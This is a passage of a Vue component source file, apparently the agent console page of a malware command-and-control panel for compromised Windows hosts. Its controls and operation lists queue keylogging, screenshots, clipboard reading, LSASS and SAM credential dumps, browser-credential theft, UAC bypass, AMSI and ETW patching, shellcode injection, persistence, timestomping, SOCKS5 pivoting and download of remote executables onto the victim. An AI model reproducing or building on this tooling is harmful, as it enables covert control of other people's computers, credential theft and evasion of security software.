<template>
  <div class="page" style="max-width:100%">
    <!-- Header -->
    <div class="page-header" style="margin-bottom:16px">
      <div style="display:flex;align-items:center;gap:12px">
        <button class="btn btn-ghost btn-sm btn-icon" @click="$router.back()">
          <svg width="14" height="14" viewBox="0 0 16 16" fill="currentColor">
            <path d="M7.78 12.53a.75.75 0 01-1.06 0L2.47 8.28a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 1.06L4.81 7h7.44a.75.75 0 010 1.5H4.81l2.97 2.97a.75.75 0 010 1.06z"/>
          </svg>
        </button>
        <div>
          <div class="page-title" style="display:flex;align-items:center;gap:10px">
            {{ agent?.hostname || 'Unknown' }}
            <StatusBadge v-if="agent" :status="agent.status" />
            <span v-if="agent?.privileges === 'admin'" class="priv-badge admin">★ Admin</span>
          </div>
          <div class="page-desc td-mono" style="font-size:11px">{{ agentId }}</div>
        </div>
      </div>
    </div>

    <div v-if="!agent && !agentStore.loading" class="card" style="padding:48px;text-align:center">
      <div style="color:var(--text-muted)">Agent not found.</div>
      <RouterLink to="/agents" class="btn btn-ghost btn-sm" style="margin-top:12px">← Back to Agents</RouterLink>
    </div>

    <div v-else style="display:grid;grid-template-columns:260px 1fr;gap:14px;align-items:start">

      <!-- Left sidebar -->
      <div style="display:flex;flex-direction:column;gap:10px">

        <!-- Agent info -->
        <div class="card">
          <div class="card-header"><span class="card-title">Agent Info</span></div>
          <div class="card-body" style="padding:0">
            <table class="info-table">
              <tbody>
                <tr><td class="info-label">ID</td>
                    <td class="td-mono" style="font-size:10px;word-break:break-all;color:var(--text-muted)">{{ agent?.id }}</td></tr>
                <tr><td class="info-label">Hostname</td><td>{{ agent?.hostname || '—' }}</td></tr>
                <tr><td class="info-label">User</td><td>{{ agent?.username || '—' }}</td></tr>
                <tr><td class="info-label">OS</td><td>{{ agent?.os || '—' }}</td></tr>
                <tr><td class="info-label">Arch</td><td class="td-mono">{{ agent?.arch || '—' }}</td></tr>
                <tr><td class="info-label">IP</td><td class="td-mono">{{ agent?.ip || '—' }}</td></tr>
                <tr><td class="info-label">PID</td><td class="td-mono">{{ agent?.pid || '—' }}</td></tr>
                <tr><td class="info-label">Privileges</td>
                    <td>
                      <span v-if="agent?.privileges" :class="['priv-badge', agent.privileges]">
                        {{ agent.privileges === 'admin' ? '★ Admin' : 'User' }}
                      </span>
                      <span v-else class="td-muted">—</span>
                    </td></tr>
                <tr><td class="info-label">Interval</td><td>{{ agent?.check_in_interval ? agent.check_in_interval + 's' : '—' }}</td></tr>
                <tr><td class="info-label">Last Seen</td><td style="font-size:12px">{{ relTime(agent?.last_seen || '') }}</td></tr>
                <tr><td class="info-label">First Seen</td><td style="font-size:12px">{{ fmtDate(agent?.first_seen || '') }}</td></tr>
              </tbody>
            </table>
          </div>
        </div>

        <!-- SOCKS5 status -->
        <div class="card" v-if="socks5Active">
          <div class="card-header">
            <span class="card-title">SOCKS5 Pivot</span>
            <span class="status-badge online"><span class="badge-dot" style="background:var(--green)" />Active</span>
          </div>
          <div class="card-body">
            <div style="font-size:12px;font-family:var(--font-mono);color:var(--cyan)">{{ socks5Addr }}</div>
            <button class="btn btn-ghost btn-sm" style="margin-top:8px;color:var(--red)"
                    @click="queueOp('socks5_stop', {})">Stop SOCKS5</button>
          </div>
        </div>

        <!-- Quick actions -->
        <div class="card">
          <div class="card-header"><span class="card-title">Quick Actions</span></div>
          <div class="card-body" style="display:flex;flex-direction:column;gap:6px">
            <button class="btn btn-ghost btn-sm" style="justify-content:flex-start" @click="queueOp('screenshot', {})">
              📸 Screenshot
            </button>
            <button class="btn btn-ghost btn-sm" style="justify-content:flex-start" @click="queueOp('clipboard_read', {})">
              📋 Clipboard
            </button>
            <button class="btn btn-ghost btn-sm" style="justify-content:flex-start" @click="queueOp('antidebug', {})">
              🔍 Anti-Debug Check
            </button>
            <button class="btn btn-ghost btn-sm" style="justify-content:flex-start" @click="queueOp('antivm', {})">
              🖥 Anti-VM Check
            </button>
            <button class="btn btn-ghost btn-sm" style="justify-content:flex-start;color:var(--orange)" @click="queueOp('sleep_obf', { duration: 30 })">
              ⏸ Obf Sleep 30s
            </button>
          </div>
        </div>

        <!-- Danger zone -->
        <div class="card">
          <div class="card-header"><span class="card-title" style="color:var(--red)">Danger Zone</span></div>
          <div class="card-body" style="display:flex;flex-direction:column;gap:6px">
            <button class="btn btn-ghost btn-sm" style="color:var(--orange);justify-content:flex-start" @click="queueOp('kill', {})">
              ⚡ Kill Agent
            </button>
            <button class="btn btn-ghost btn-sm" style="color:var(--red);justify-content:flex-start" @click="confirmRemove = true">
              🗑 Remove from Server
            </button>
          </div>
        </div>
      </div>

      <!-- Main panel -->
      <div style="display:flex;flex-direction:column;gap:12px;min-width:0">

        <!-- Tabs -->
        <div class="tab-bar">
          <button v-for="tab in allTabs" :key="tab.id"
                  :class="['tab-btn', activeTab === tab.id && 'active']"
                  @click="switchTab(tab.id)">
            {{ tab.label }}
            <span v-if="tab.badge" class="tab-badge">{{ tab.badge }}</span>
          </button>
        </div>

        <!-- ── Console ──────────────────────────────────── -->
        <template v-if="activeTab === 'console'">
          <div class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">Terminal</span>
              <div style="display:flex;gap:8px">
                <button class="btn btn-ghost btn-sm" @click="termLines = []">Clear</button>
                <button class="btn btn-ghost btn-sm" :class="autoScroll && 'btn-primary'" @click="autoScroll = !autoScroll">Auto-scroll</button>
              </div>
            </div>
            <div class="terminal" ref="termEl" @scroll="onTermScroll">
              <div v-if="!termLines.length" style="color:var(--text-muted);font-style:italic;padding:14px">
                No output yet. Queue a command below.
              </div>
              <div v-for="(line, i) in termLines" :key="i" :class="['term-line', line.type]">
                <span class="term-ts">{{ line.ts }}</span>
                <span class="term-prefix">{{ termPrefix(line.type) }}</span>
                <span class="term-content" v-html="line.html || escHtml(line.text)" />
              </div>
            </div>
          </div>

          <!-- Screenshot inline viewer -->
          <div v-if="lastScreenshot" class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">Screenshot</span>
              <div style="display:flex;gap:8px">
                <a :href="'data:image/png;base64,'+lastScreenshot" download="screenshot.png" class="btn btn-ghost btn-sm">Download</a>
                <button class="btn btn-ghost btn-sm btn-icon" @click="lastScreenshot = ''">✕</button>
              </div>
            </div>
            <div style="padding:12px;background:var(--bg-deep);border-radius:0 0 var(--r-lg) var(--r-lg)">
              <img :src="'data:image/png;base64,'+lastScreenshot" style="max-width:100%;border-radius:4px;display:block" />
            </div>
          </div>

          <!-- Command input -->
          <div class="card">
            <div class="card-header"><span class="card-title">Queue Command</span></div>
            <div class="card-body" style="display:flex;flex-direction:column;gap:10px">
              <div style="display:flex;gap:8px;flex-wrap:wrap">
                <select v-model="selectedOp" class="input" style="flex:0 0 200px">
                  <optgroup v-for="grp in opGroups" :key="grp.label" :label="grp.label">
                    <option v-for="op in grp.ops" :key="op.value" :value="op.value">{{ op.label }}</option>
                  </optgroup>
                </select>
                <input v-model="cmdArgs" class="input input-mono" style="flex:1;min-width:160px"
                       :placeholder="opPlaceholder" @keyup.enter="queueCommand" />
              </div>
              <div v-if="needsPayload">
                <textarea v-model="cmdPayload" class="input input-mono"
                          style="min-height:72px;resize:vertical;font-size:12px"
                          placeholder='{"key": "value"} — JSON payload' />
              </div>
              <div style="display:flex;justify-content:flex-end;gap:8px">
                <button class="btn btn-ghost btn-sm" @click="cmdArgs='';cmdPayload=''">Clear</button>
                <button class="btn btn-primary" @click="queueCommand" :disabled="!selectedOp || queueing">
                  <div v-if="queueing" class="loading-spinner" style="width:12px;height:12px" />
                  <span v-else>Queue →</span>
                </button>
              </div>
            </div>
          </div>
        </template>

        <!-- ── Processes ────────────────────────────────── -->
        <template v-if="activeTab === 'processes'">
          <div class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">Process List</span>
              <div style="display:flex;gap:8px">
                <input v-model="procSearch" class="input" placeholder="Filter…" style="width:160px;padding:4px 8px;font-size:12px" />
                <button class="btn btn-ghost btn-sm" @click="fetchProcesses" :disabled="loadingProcs">
                  <div v-if="loadingProcs" class="loading-spinner" style="width:12px;height:12px" />
                  <span v-else>Refresh</span>
                </button>
              </div>
            </div>
            <div class="table-wrap" style="max-height:500px;overflow-y:auto">
              <table>
                <thead>
                  <tr>
                    <th>PID</th>
                    <th>Name</th>
                    <th>User</th>
                    <th>CPU%</th>
                    <th>Mem</th>
                    <th style="width:60px"></th>
                  </tr>
                </thead>
                <tbody>
                  <tr v-if="loadingProcs && !processes.length" class="loading-row">
                    <td colspan="6"><div class="loading-spinner" style="margin:0 auto" /></td>
                  </tr>
                  <tr v-else-if="!filteredProcs.length" class="loading-row">
                    <td colspan="6">{{ processes.length ? 'No match' : 'Run refresh to enumerate processes' }}</td>
                  </tr>
                  <tr v-for="p in filteredProcs" :key="p.pid">
                    <td class="td-mono" style="font-size:12px;color:var(--text-muted)">{{ p.pid }}</td>
                    <td style="font-weight:500;font-size:13px">{{ p.name }}</td>
                    <td class="td-muted" style="font-size:12px">{{ p.user || '—' }}</td>
                    <td class="td-muted" style="font-size:12px">{{ p.cpu?.toFixed(1) ?? '—' }}%</td>
                    <td class="td-muted" style="font-size:12px">{{ fmtSize(p.mem) }}</td>
                    <td>
                      <button class="btn btn-ghost btn-sm" style="color:var(--red);padding:2px 8px"
                              @click="killProcess(p.pid)">Kill</button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <!-- Inject into process -->
          <div class="card">
            <div class="card-header"><span class="card-title">Inject into Process</span></div>
            <div class="card-body" style="display:flex;gap:8px;flex-wrap:wrap">
              <input v-model="injectPid" class="input input-mono" placeholder="PID" style="width:80px" type="number" />
              <select v-model="injectMethod" class="input" style="width:120px">
                <option value="crt">CreateRemoteThread</option>
                <option value="apc">QueueUserAPC</option>
              </select>
              <input v-model="injectShellcode" class="input input-mono" placeholder="Shellcode (base64)…" style="flex:1;min-width:200px" />
              <button class="btn btn-primary" @click="doInject" :disabled="!injectPid || !injectShellcode">Inject</button>
            </div>
          </div>
        </template>

        <!-- ── File Browser ─────────────────────────────── -->
        <template v-if="activeTab === 'files'">
          <div class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">File Browser</span>
              <div style="display:flex;gap:8px;align-items:center">
                <input v-model="currentPath" class="input input-mono" placeholder="C:\\" style="width:260px;font-size:12px"
                       @keyup.enter="listDir(currentPath)" />
                <button class="btn btn-ghost btn-sm" @click="listDir(currentPath)" :disabled="loadingFiles">
                  <div v-if="loadingFiles" class="loading-spinner" style="width:12px;height:12px" />
                  <span v-else>List</span>
                </button>
              </div>
            </div>
            <div class="table-wrap" style="max-height:400px;overflow-y:auto">
              <table>
                <thead>
                  <tr><th>Name</th><th>Type</th><th>Size</th><th style="width:120px"></th></tr>
                </thead>
                <tbody>
                  <tr v-if="!fileEntries.length" class="loading-row">
                    <td colspan="4">{{ loadingFiles ? '' : 'Enter a path and press List' }}</td>
                  </tr>
                  <tr v-for="f in fileEntries" :key="f.name">
                    <td style="font-family:var(--font-mono);font-size:12px">
                      <span :style="`color:${f.is_dir ? 'var(--cyan)' : 'var(--text-primary)'}`">
                        {{ f.is_dir ? '📁' : '📄' }} {{ f.name }}
                      </span>
                    </td>
                    <td class="td-muted" style="font-size:12px">{{ f.is_dir ? 'Directory' : 'File' }}</td>
                    <td class="td-muted" style="font-size:12px">{{ f.is_dir ? '—' : fmtSize(f.size) }}</td>
                    <td>
                      <button v-if="!f.is_dir" class="btn btn-ghost btn-sm" @click="downloadFile(f.name)" style="font-size:11px">Download</button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>

          <!-- Upload -->
          <div class="card">
            <div class="card-header"><span class="card-title">Upload File to Agent</span></div>
            <div class="card-body" style="display:flex;gap:8px;flex-wrap:wrap;align-items:flex-end">
              <div style="flex:1;min-width:200px">
                <label class="form-label">Local File</label>
                <input ref="uploadInput" type="file" style="display:none" @change="onUploadSelect" />
                <div style="display:flex;gap:6px">
                  <input :value="uploadFile?.name || ''" class="input" readonly placeholder="Select file…" style="flex:1" />
                  <button class="btn btn-ghost btn-sm" @click="uploadInput?.click()">Browse</button>
                </div>
              </div>
              <div style="flex:1;min-width:200px">
                <label class="form-label">Destination Path</label>
                <input v-model="uploadDest" class="input input-mono" placeholder="C:\Windows\Temp\file.exe" />
              </div>
              <button class="btn btn-primary" @click="doUpload" :disabled="!uploadFile || !uploadDest || uploading">
                <div v-if="uploading" class="loading-spinner" style="width:12px;height:12px" />
                <span v-else>Upload</span>
              </button>
            </div>
          </div>

          <!-- Download -->
          <div class="card">
            <div class="card-header"><span class="card-title">Download File from Agent</span></div>
            <div class="card-body" style="display:flex;gap:8px;align-items:flex-end">
              <div style="flex:1">
                <label class="form-label">Remote Path</label>
                <input v-model="downloadPath" class="input input-mono" placeholder="C:\secret.txt" @keyup.enter="doDownload" />
              </div>
              <button class="btn btn-primary" @click="doDownload" :disabled="!downloadPath || downloading">
                <div v-if="downloading" class="loading-spinner" style="width:12px;height:12px" />
                <span v-else>Download</span>
              </button>
            </div>
          </div>
        </template>

        <!-- ── Keylog ───────────────────────────────────── -->
        <template v-if="activeTab === 'keylog'">
          <div class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">Keylogger</span>
              <div style="display:flex;gap:8px">
                <span v-if="keylogRunning" class="status-badge online">
                  <span class="badge-dot" style="background:var(--green);animation:pulse-glow 2s infinite" />
                  Running
                </span>
                <button class="btn btn-ghost btn-sm" @click="klStart" :disabled="keylogRunning">Start</button>
                <button class="btn btn-ghost btn-sm" @click="klDump" :disabled="!keylogRunning">Dump</button>
                <button class="btn btn-ghost btn-sm" @click="klStop" :disabled="!keylogRunning" style="color:var(--orange)">Stop</button>
                <button class="btn btn-ghost btn-sm" @click="klClear" style="color:var(--red)">Clear</button>
              </div>
            </div>
            <div class="terminal" style="min-height:300px;max-height:500px;overflow-y:auto">
              <div v-if="!keylogOutput" style="color:var(--text-muted);font-style:italic;padding:14px">
                Keylog buffer is empty. Start the keylogger then dump to see captured keys.
              </div>
              <pre v-else style="margin:0;padding:14px;white-space:pre-wrap;word-break:break-all;color:var(--text-primary)">{{ keylogOutput }}</pre>
            </div>
            <div v-if="keylogOutput" style="padding:8px 14px;border-top:1px solid var(--border-muted);display:flex;justify-content:space-between;align-items:center">
              <span style="font-size:11px;color:var(--text-muted)">{{ keylogOutput.length }} chars captured</span>
              <button class="btn btn-ghost btn-sm" @click="copyText(keylogOutput)">Copy</button>
            </div>
          </div>
        </template>

        <!-- ── History ──────────────────────────────────── -->
        <template v-if="activeTab === 'history'">
          <div class="card">
            <div class="card-header" style="justify-content:space-between">
              <span class="card-title">Command History</span>
              <div style="display:flex;gap:8px">
                <select v-model="histFilter" class="input" style="width:130px;padding:4px 8px;font-size:12px">
                  <option value="">All</option>
                  <option value="pending">Pending</option>
                  <option value="executing">Executing</option>
                  <option value="completed">Completed</option>
                  <option value="failed">Failed</option>
                </select>
                <button class="btn btn-ghost btn-sm" @click="fetchCommands">Refresh</button>
                <button class="btn btn-ghost btn-sm" style="color:var(--red)" @click="clearQueue">Clear Queue</button>
              </div>
            </div>
            <div class="table-wrap">
              <table>
                <thead>
                  <tr><th>Op</th><th>Status</th><th>Queued</th><th>Duration</th><th style="width:50px"></th></tr>
                </thead>
                <tbody>
                  <tr v-if="loadingCmds" class="loading-row">
                    <td colspan="5"><div class="loading-spinner" style="margin:0 auto" /></td>
                  </tr>
                  <tr v-else-if="!filteredCmds.length" class="loading-row">
                    <td colspan="5">No commands</td>
                  </tr>
                  <tr v-for="c in filteredCmds" :key="c.id" class="clickable"
                      @click="selectedCmd = selectedCmd?.id === c.id ? null : c"
                      :class="selectedCmd?.id === c.id && 'row-selected'">
                    <td class="td-mono" style="font-size:12px;color:var(--cyan)">{{ c.op }}</td>
                    <td><CmdStatusBadge :status="c.status" /></td>
                    <td class="td-muted" style="font-size:12px">{{ relTime(c.created_at) }}</td>
                    <td class="td-muted" style="font-size:12px">{{ duration(c) }}</td>
                    <td>
                      <button class="btn btn-ghost btn-sm btn-icon" @click.stop="outputModal = c">
                        <svg width="11" height="11" viewBox="0 0 16 16" fill="currentColor">
                          <path d="M0 2.75A1.75 1.75 0 011.75 1h12.5A1.75 1.75 0 0116 2.75v10.5A1.75 1.75 0 0114.25 15H1.75A1.75 1.75 0 010 13.25V2.75zm1.75-.25a.25.25 0 00-.25.25v10.5c0 .138.112.25.25.25h12.5a.25.25 0 00.25-.25V2.75a.25.25 0 00-.25-.25H1.75zm3.72 3.22a.75.75 0 010 1.06L4.31 8l1.16 1.22a.75.75 0 11-1.09 1.03l-1.75-1.84a.75.75 0 010-1.03l1.75-1.84a.75.75 0 011.06.03zm4.56 0a.75.75 0 011.06-.03l1.75 1.84a.75.75 0 010 1.03l-1.75 1.84a.75.75 0 11-1.09-1.03L11.69 8l-1.16-1.22a.75.75 0 01.03-1.06zm-1.78.28a.75.75 0 01.45.96l-1.5 4a.75.75 0 01-1.41-.52l1.5-4a.75.75 0 01.96-.44z"/>
                        </svg>
                      </button>
                    </td>
                  </tr>
                </tbody>
              </table>
            </div>
            <div v-if="selectedCmd" style="border-top:1px solid var(--border-muted);padding:12px 14px">
              <div style="font-size:11px;color:var(--text-muted);margin-bottom:6px;display:flex;justify-content:space-between">
                <span>Output — <code style="color:var(--cyan)">{{ selectedCmd.op }}</code></span>
                <button class="btn btn-ghost btn-sm btn-icon" @click="selectedCmd = null">✕</button>
              </div>
              <div class="terminal" style="max-height:220px;overflow-y:auto">
                <pre style="margin:0;padding:10px;white-space:pre-wrap;word-break:break-all">{{ selectedCmd.output || '(no output)' }}</pre>
              </div>
            </div>
          </div>
        </template>
      </div>
    </div>

    <!-- Remove confirm -->
    <div v-if="confirmRemove" class="modal-overlay" @click.self="confirmRemove = false">
      <div class="modal">
        <div class="modal-header">Remove Agent</div>
        <div class="modal-body">
          <p style="font-size:13px;color:var(--text-secondary)">
            Remove <strong>{{ agent?.hostname }}</strong> from server? Agent will re-register on next checkin.
          </p>
        </div>
        <div class="modal-footer">
          <button class="btn btn-ghost" @click="confirmRemove = false">Cancel</button>
          <button class="btn btn-danger" @click="doRemove">Remove</button>
        </div>
      </div>
    </div>

    <!-- Output modal -->
    <div v-if="outputModal" class="modal-overlay" @click.self="outputModal = null">
      <div class="modal" style="max-width:720px;width:90vw">
        <div class="modal-header">
          Output — <code style="font-size:13px">{{ outputModal.op }}</code>
          <span style="margin-left:8px"><CmdStatusBadge :status="outputModal.status" /></span>
        </div>
        <div class="modal-body" style="padding:0">
          <div class="terminal" style="max-height:60vh;border-radius:0;overflow-y:auto">
            <pre style="margin:0;padding:14px;white-space:pre-wrap;word-break:break-all">{{ outputModal.output || '(no output)' }}</pre>
          </div>
        </div>
        <div class="modal-footer">
          <button class="btn btn-ghost" @click="outputModal = null">Close</button>
          <button class="btn btn-ghost btn-sm" @click="copyText(outputModal?.output || '')">Copy</button>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
import { ref, computed, watch, nextTick, onMounted, onUnmounted } from 'vue'
import { useRoute, useRouter } from 'vue-router'
import { useAgentStore } from '@/stores/agents'
import { commandApi, processApi, fileApi, reconApi } from '@/api'
import type { ProcessEntry } from '@/api'
import type { Command } from '@/api/types'
import StatusBadge    from '@/components/ui/StatusBadge.vue'
import CmdStatusBadge from '@/components/ui/CmdStatusBadge.vue'

const route      = useRoute()
const router     = useRouter()
const agentStore = useAgentStore()

const agentId = computed(() => route.params.id as string)
const agent   = computed(() => agentStore.byId(agentId.value))

// ── Tabs ──────────────────────────────────────────────────────────────────
type TabId = 'console' | 'processes' | 'files' | 'keylog' | 'history'
const activeTab = ref<TabId>('console')

const allTabs = computed(() => [
  { id: 'console'   as TabId, label: 'Console'   },
  { id: 'processes' as TabId, label: 'Processes'  },
  { id: 'files'     as TabId, label: 'Files'      },
  { id: 'keylog'    as TabId, label: 'Keylog'     },
  { id: 'history'   as TabId, label: 'History', badge: agentCmds.value.length || undefined },
])

function switchTab(id: TabId) {
  activeTab.value = id
  if (id === 'history') fetchCommands()
  if (id === 'processes') fetchProcesses()
}

// ── Terminal ──────────────────────────────────────────────────────────────
interface TermLine { type: 'cmd'|'out'|'err'|'info'; text: string; html?: string; ts: string }
const termLines  = ref<TermLine[]>([])
const termEl     = ref<HTMLElement|null>(null)
const autoScroll = ref(true)
const lastScreenshot = ref('')

function addLine(type: TermLine['type'], text: string, html?: string) {
  const ts = new Date().toLocaleTimeString('en-US', { hour12: false })
  termLines.value.push({ type, text, ts, html })
  if (autoScroll.value) nextTick(() => { if (termEl.value) termEl.value.scrollTop = termEl.value.scrollHeight })
}

function termPrefix(type: string) {
  if (type === 'cmd')  return '▶ '
  if (type === 'err')  return '✕ '
  if (type === 'info') return 'ℹ '
  return '  '
}

function escHtml(s: string) {
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
}

function onTermScroll() {
  if (!termEl.value) return
  const { scrollTop, scrollHeight, clientHeight } = termEl.value
  autoScroll.value = scrollHeight - scrollTop - clientHeight < 40
}

// ── Command queueing ──────────────────────────────────────────────────────
const selectedOp  = ref('shell')
const cmdArgs     = ref('')
const cmdPayload  = ref('')
const queueing    = ref(false)
const pollers     = ref<ReturnType<typeof setInterval>[]>([])

const opGroups = [
  { label: 'Execution', ops: [
    { value: 'shell',          label: 'Shell Command'       },
    { value: 'powershell',     label: 'PowerShell'          },
    { value: 'ps_runspace',    label: 'PS Runspace'         },
    { value: 'dotnet_exec',    label: '.NET Assembly (BOF)' },
    { value: 'pe_load',        label: 'PE Load (in-memory)' },
    { value: 'bof_exec',       label: 'BOF Execute'         },
  ]},
  { label: 'Recon', ops: [
    { value: 'screenshot',     label: 'Screenshot'          },
    { value: 'keylog_start',   label: 'Keylog Start'        },
    { value: 'keylog_dump',    label: 'Keylog Dump'         },
    { value: 'keylog_stop',    label: 'Keylog Stop'         },
    { value: 'clipboard_read', label: 'Clipboard Read'      },
    { value: 'net_scan',       label: 'Net Scan'            },
    { value: 'arp_scan',       label: 'ARP Scan'            },
  ]},
  { label: 'File Ops', ops: [
    { value: 'ls',             label: 'List Files'          },
    { value: 'cd',             label: 'Change Dir'          },
    { value: 'upload',         label: 'Upload'              },
    { value: 'download',       label: 'Download'            },
    { value: 'rm',             label: 'Delete'              },
    { value: 'mv',             label: 'Move/Rename'         },
    { value: 'timestomp',      label: 'Timestomp'           },
    { value: 'ads_write',      label: 'ADS Write'           },
    { value: 'ads_exec',       label: 'ADS Exec'            },
    { value: 'stego_extract',  label: 'Stego Extract'       },
    { value: 'lolbin_fetch',   label: 'LOLBin Fetch'        },
  ]},
  { label: 'Privilege', ops: [
    { value: 'token_list',     label: 'Token List'          },
    { value: 'token_steal',    label: 'Token Steal'         },
    { value: 'token_make',     label: 'Token Make'          },
    { value: 'token_revert',   label: 'Token Revert'        },
    { value: 'uac_bypass',     label: 'UAC Bypass'          },
    { value: 'lsass_dump_dup', label: 'LSASS Dump (Dup)'   },
    { value: 'lsass_dump_wer', label: 'LSASS Dump (WER)'   },
    { value: 'sam_dump',       label: 'SAM Dump'            },
    { value: 'browsercreds',   label: 'Browser Creds'       },
  ]},
  { label: 'Evasion', ops: [
    { value: 'amsi_bypass',    label: 'AMSI Patch'          },
    { value: 'amsi_hwbp',      label: 'AMSI HWBP'           },
    { value: 'etw_bypass',     label: 'ETW Patch'           },
    { value: 'etw_hwbp',       label: 'ETW HWBP'            },
    { value: 'unhook_ntdll',   label: 'Unhook NTDLL'        },
    { value: 'sleep_obf',      label: 'Obf Sleep'           },
    { value: 'antidebug',      label: 'Anti-Debug Check'    },
    { value: 'antivm',         label: 'Anti-VM Check'       },
    { value: 'timegate_set',   label: 'OPSEC Timegate'      },
  ]},
  { label: 'Lateral / Inject', ops: [
    { value: 'inject_remote',      label: 'Remote Inject'       },
    { value: 'inject_self',        label: 'Self Inject'         },
    { value: 'hollow',             label: 'Process Hollow'      },
    { value: 'hijack',             label: 'Thread Hijack'       },
    { value: 'stomp',              label: 'Module Stomp'        },
    { value: 'mapinject',          label: 'Section Map Inject'  },
    { value: 'threadless_inject',  label: 'Threadless Inject'   },
    { value: 'ppid_spoof',         label: 'PPID Spoof'          },
    { value: 'socks5_start',       label: 'SOCKS5 Start'        },
    { value: 'socks5_stop',        label: 'SOCKS5 Stop'         },
    { value: 'socks5_status',      label: 'SOCKS5 Status'       },
  ]},
  { label: 'Persistence', ops: [
    { value: 'persist_setup',  label: 'Persistence Setup'   },
    { value: 'persist_remove', label: 'Persistence Remove'  },
    { value: 'reg_read',       label: 'Registry Read'       },
    { value: 'reg_write',      label: 'Registry Write'      },
    { value: 'reg_delete',     label: 'Registry Delete'     },
    { value: 'reg_list',       label: 'Registry List'       },
  ]},
  { label: 'Agent', ops: [
    { value: 'sleep',          label: 'Sleep (interval)'    },
    { value: 'kill',           label: 'Kill Agent'          },
  ]},
]

const opPlaceholder = computed(() => {
  const map: Record<string, string> = {
    shell:        'whoami /all',
    powershell:   'Get-Process',
    ls:           'C:\\Windows\\System32',
    download:     'C:\\secret.txt',
    net_scan:     '192.168.1.0/24 --ports 22,80,443',
    inject_remote:'<pid> crt',
    sleep:        '30',
    socks5_start: '127.0.0.1:1080',
    reg_read:     'HKLM\\SOFTWARE\\Key ValueName',
    lolbin_fetch: 'https://host/file.exe C:\\out.exe',
    timegate_set: '--work-start 8 --work-end 18',
  }
  return map[selectedOp.value] || 'Arguments…'
})

const needsPayload = computed(() =>
  ['dotnet_exec','pe_load','ps_runspace','threadless_inject','bof_exec'].includes(selectedOp.value)
)

async function queueCommand() {
  if (!selectedOp.value || queueing.value) return
  queueing.value = true
  const payload: Record<string, unknown> = { op: selectedOp.value }
  const args = cmdArgs.value.trim()
  if (args) {
    if (['shell','powershell','ps_runspace'].includes(selectedOp.value)) payload.cmd = args
    else if (selectedOp.value === 'sleep')          payload.interval = parseInt(args) || 30
    else if (selectedOp.value === 'socks5_start')   payload.socks5_addr = args
    else if (['ls','cd','download','rm','timestomp'].includes(selectedOp.value)) payload.path = args
    else if (selectedOp.value === 'mv')             { const p = args.split(' '); payload.src = p[0]; payload.dst = p[1] }
    else                                             payload.args = args
  }
  if (cmdPayload.value.trim()) {
    try { Object.assign(payload, JSON.parse(cmdPayload.value)) }
    catch { addLine('err', 'Invalid JSON payload'); queueing.value = false; return }
  }
  addLine('cmd', `[${selectedOp.value}] ${args}`)
  try {
    const resp = await commandApi.queue(agentId.value, payload)
    const cmdId = resp.data?.data?.command_id
    addLine('info', `Queued → ${cmdId || 'ok'}`)
    cmdArgs.value = ''
    cmdPayload.value = ''
    if (cmdId) pollResult(cmdId, selectedOp.value)
    fetchCommands()
  } catch (e: unknown) {
    const err = e as { response?: { data?: { error?: string } } }
    addLine('err', err?.response?.data?.error || 'Failed to queue')
  } finally { queueing.value = false }
}

async function queueOp(op: string, params: Record<string, unknown>) {
  addLine('cmd', `[${op}]`)
  try {
    const resp = await commandApi.queue(agentId.value, { op, ...params })
    const cmdId = resp.data?.data?.command_id
    addLine('info', `Queued → ${cmdId || 'ok'}`)
    if (cmdId) pollResult(cmdId, op)
  } catch (e: unknown) {
    const err = e as { response?: { data?: { error?: string } } }
    addLine('err', err?.response?.data?.error || 'Failed')
  }
}

async function pollResult(cmdId: string, op: string) {
  let tries = 0
  const interval = setInterval(async () => {
    tries++
    try {
      const resp = await commandApi.get(cmdId)
      const cmd  = resp.data?.data
      if (cmd?.status === 'completed' || cmd?.status === 'failed') {
        clearInterval(interval)
        if (op === 'screenshot' && cmd.status === 'completed' && cmd.output) {
          lastScreenshot.value = cmd.output.trim()
          addLine('info', 'Screenshot captured — see viewer below')
          if (activeTab.value !== 'console') switchTab('console')
        } else if (op === 'keylog_dump' || op === 'keylog_stop') {
          if (cmd.output) keylogOutput.value = cmd.output
          if (op === 'keylog_stop') keylogRunning.value = false
          addLine(cmd.status === 'completed' ? 'info' : 'err', `Keylog: ${cmd.status}`)
        } else {
          const type = cmd.status === 'completed' ? 'out' : 'err'
          ;(cmd.output || `(${cmd.status})`).split('\n').forEach((l: string) => addLine(type, l))
        }
        fetchCommands()
      }
    } catch { /* ignore */ }
    if (tries >= 90) clearInterval(interval)
  }, 2000)
  pollers.value.push(interval)
}

// ── Processes ─────────────────────────────────────────────────────────────
const processes   = ref<ProcessEntry[]>([])
const loadingProcs = ref(false)
const procSearch  = ref('')
const injectPid   = ref<number|null>(null)
const injectMethod = ref('crt')
const injectShellcode = ref('')

const filteredProcs = computed(() => {
  if (!procSearch.value) return processes.value
  const q = procSearch.value.toLowerCase()
  return processes.value.filter(p => p.name.toLowerCase().includes(q) || String(p.pid).includes(q))
})

async function fetchProcesses() {
  loadingProcs.value = true
  try {
    const r = await processApi.list(agentId.value)
    processes.value = r.data?.data?.processes || []
  } catch { /* ignore */ }
  finally { loadingProcs.value = false }
}

async function killProcess(pid: number) {
  if (!confirm(`Kill PID ${pid}?`)) return
  try {
    await processApi.kill(agentId.value, pid)
    addLine('info', `Kill signal sent to PID ${pid}`)
    setTimeout(fetchProcesses, 2000)
  } catch (e: unknown) {
    const err = e as { response?: { data?: { error?: string } } }
    addLine('err', err?.response?.data?.error || 'Kill failed')
  }
}

async function doInject() {
  if (!injectPid.value || !injectShellcode.value) return
  await queueOp('inject_remote', {
    pid:            injectPid.value,
    shellcode:      injectShellcode.value,
    inject_method:  injectMethod.value,
  })
  injectShellcode.value = ''
}

// ── Files ─────────────────────────────────────────────────────────────────
interface FileEntry { name: string; is_dir: boolean; size?: number }
const fileEntries  = ref<FileEntry[]>([])
const currentPath  = ref('C:\\')
const loadingFiles = ref(false)
